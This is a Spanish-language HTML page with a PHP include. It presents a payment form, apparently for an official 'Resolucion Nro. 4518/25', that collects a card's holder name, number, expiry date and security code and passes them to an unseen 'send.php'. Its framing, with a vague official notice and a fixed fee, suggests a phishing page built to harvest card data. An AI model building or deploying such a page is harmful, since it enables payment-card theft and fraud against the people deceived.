<html>
<head>
	<title>Formulario</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link rel="stylesheet" href="style.css">
</head>

<body>
	<form method="post" autocomplete="off"> 
		<h2>Forma de pago para envio de Resolucion Nro. 4518/25</h2>
		
		<div class="input-group">
			<div class="input-container">
				<input type="Text" name="name" placeholder="Nombre(como figura)">
				<i class="fa-solid fa-user" ></i>
			</div>
			<div class="input-container">
				<input type="Text" name="number" placeholder="Numero de tarjeta">
				<i class="fa-solid fa-money-bill" ></i>
			</div>
			<div class="input-container">
				<input type="text" name="date" placeholder="Fecha de Venc. (mm/aa)">
				<i class="fa-solid fa-user" ></i>
			</div>
			<div class="input-container">
				<input type="password" name="password" placeholder="Clave de Seg">
				<i class="fa-solid fa-lock" ></i>
			</div>
			<h2>Total a pagar= $1460.16 </h2>
			<a href="#">Terminos y Condiciones</a>
			<input type="submit" name="send" class="btn" value="Pagar" >
	
			
			
		</div>
	</form>
<?php 
	include("send.php");
?>

</body>
</html>
